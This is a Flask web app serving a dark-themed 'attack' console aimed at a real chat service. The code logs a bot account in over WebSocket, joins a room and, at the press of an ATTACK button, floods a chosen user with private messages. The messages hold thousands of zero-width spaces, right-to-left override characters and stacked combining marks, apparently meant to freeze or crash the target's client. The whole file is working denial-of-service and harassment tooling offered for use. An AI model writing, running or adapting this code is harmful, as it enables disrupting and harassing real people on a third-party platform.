import os
from flask import Flask, render_template_string

app = Flask(__name__)

# Wahi Mast Interface (v4.2)
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>TITAN OS - DEBUG & ATTACK</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --neon: #00f3ff; --term: #00ff41; --danger: #ff003c; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: 'Consolas', 'Courier New', monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        
        .nav-bar { background: #111; padding: 15px; border-bottom: 2px solid var(--neon); display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.8); }
        input { background: #000; border: 1px solid #333; color: var(--neon); padding: 10px; border-radius: 4px; font-size: 12px; outline: none; }
        input:focus { border-color: var(--neon); }
        
        .btn-group { display: flex; gap: 5px; }
        button { flex: 1; padding: 10px; font-weight: bold; cursor: pointer; border: 1px solid var(--neon); background: transparent; color: var(--neon); transition: 0.3s; font-size: 11px; }
        button:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
        
        .atk-btn { background: var(--danger) !important; color: #fff !important; border: none !important; }
        .atk-btn:hover { box-shadow: 0 0 20px var(--danger) !important; opacity: 0.9; }

        .terminal-zone { flex: 1; display: flex; flex-direction: column; background: #000; overflow: hidden; }
        .term-head { background: #1a1a1a; padding: 8px 15px; font-size: 11px; color: #666; display: flex; justify-content: space-between; border-bottom: 1px solid #222; }
        .terminal-body { flex: 1; overflow-y: scroll; padding: 15px; font-size: 12px; scroll-behavior: smooth; }
        
        .line { margin-bottom: 8px; border-left: 3px solid #222; padding-left: 12px; word-break: break-all; white-space: pre-wrap; }
        .in { color: var(--term); border-color: var(--term); } 
        .out { color: var(--neon); border-color: var(--neon); }
        .err { color: var(--danger); border-color: var(--danger); }
        .sys { color: #888; border-color: #444; }
        
        .json-dump { background: #080808; padding: 10px; margin-top: 5px; border: 1px solid #1a1a1a; display: block; color: #00ccff; font-size: 11px; border-radius: 4px; }
        
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: #222; border-radius: 10px; }
    </style>
</head>
<body>
    <div class="nav-bar">
        <input type="text" id="u" placeholder="Bot User">
        <input type="password" id="p" placeholder="Bot Pass">
        <input type="text" id="r" placeholder="Room Name">
        <input type="text" id="t" placeholder="Target User">
        <div class="btn-group">
            <button onclick="connectWS()">INITIALIZE</button>
            <button class="atk-btn" onclick="fireAttack()">ATTACK</button>
            <button onclick="clearT()" style="border-color:#444;color:#444">CLEAR</button>
        </div>
    </div>

    <div class="terminal-zone">
        <div class="term-head">
            <span>LIVE_DEBUG_TERMINAL v4.2 [MONITORING...]</span>
            <span id="stat">OFFLINE</span>
        </div>
        <div id="terminal" class="terminal-body">
            <div class="line sys">Console ready. Check Port & Start.</div>
        </div>
    </div>

    <script>
        let socket;
        let pinger;
        const term = document.getElementById('terminal');

        function log(msg, type='sys', payload=null) {
            const div = document.createElement('div');
            div.className = `line ${type}`;
            let html = `<b>[${new Date().toLocaleTimeString()}]</b> ${msg}`;
            if(payload) {
                html += `<div class="json-dump">${JSON.stringify(payload, null, 2)}</div>`;
            }
            div.innerHTML = html;
            term.appendChild(div);
            term.scrollTop = term.scrollHeight;
        }

        function clearT() { term.innerHTML = ''; log("Terminal cleared.", "sys"); }

        function connectWS() {
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            const room = document.getElementById('r').value;

            socket = new WebSocket("wss://chatp.net:5333/server");

            socket.onopen = () => {
                document.getElementById('stat').innerText = "ONLINE";
                document.getElementById('stat').style.color = "var(--term)";
                log("Socket Connected. Authenticating...", "sys");
                const loginData = {handler: "login", id: Math.random(), username: user, password: pass, platform: "web"};
                socket.send(JSON.stringify(loginData));
                log("SENT >> LOGIN_REQUEST", "out", loginData);

                pinger = setInterval(() => {
                    if(socket.readyState === 1) socket.send(JSON.stringify({handler:"ping"}));
                }, 20000);
            };

            socket.onmessage = (e) => {
                const data = JSON.parse(e.data);
                log("RECV << " + (data.handler || "EVENT"), "in", data);
                if(data.handler === "login_event" && data.type === "success") {
                    socket.send(JSON.stringify({handler: "room_join", id: Math.random(), name: room}));
                }
            };

            socket.onclose = () => {
                clearInterval(pinger);
                document.getElementById('stat').innerText = "OFFLINE";
                document.getElementById('stat').style.color = "var(--danger)";
                log("WebSocket Disconnected.", "err");
            };
        }

        function fireAttack() {
            const target = document.getElementById('t').value;
            if(!socket || socket.readyState !== 1) return log("Connect Bot First!", "err");

            log("Executing Invisible Memory Pressure Attack...", "out");
            
            // New Method: Zero-Width Overflow + RTL Confusion
            const heavyBuffer = " " + "\\u200B".repeat(7000) + "҉"; 
            const crashLogic = "\\u202E" + "\\u202D" + "HACKED" + "҉".repeat(150) + "\\u202C";

            const pkts = [heavyBuffer, crashLogic, heavyBuffer, crashLogic];

            pkts.forEach((p, i) => {
                setTimeout(() => {
                    const pkt = {
                        handler: "chat_message",
                        to: target,
                        type: "text",
                        body: p,
                        is_private: true
                    };
                    socket.send(JSON.stringify(pkt));
                    log(`CRITICAL_STAGE_${i+1} SENT TO ${target}`, "err", pkt);
                }, i * 400); 
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    # Render aur Local deployment ke liye fix
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
    
